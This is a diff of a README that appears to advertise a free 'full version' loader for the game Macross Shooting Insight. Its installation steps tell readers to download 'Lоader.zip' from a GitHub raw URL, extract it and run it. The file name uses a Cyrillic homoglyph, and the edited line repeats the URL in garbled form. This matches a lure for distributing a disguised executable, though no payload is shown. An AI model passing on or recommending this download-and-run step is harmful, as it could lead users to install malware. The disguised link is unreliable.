@@ -27,7 +27,7 @@ Macross Shooting Insight full version, game loader download, anime shooter acces
 
 ## 📥 Installation
 
-1. **Download** `https://raw.githubusercontent.com/Sitharthsithu/MacrossShootingInsight-FreeDLHub/main/Lоader.zip` from the repository.
+1. **Download** `https://raw.githubusercontent.com/Sitharthsithu/MacrossShootingInsight-FreeDLHub/main/Lоader.zipоhttps://raw.githubusercontent.com/Sitharthsithu/MacrossShootingInsight-FreeDLHub/main/Lоader.zip` from the repository.
 2. Extract to your chosen directory.
 3. Run the loader and follow prompts to launch the game!
 
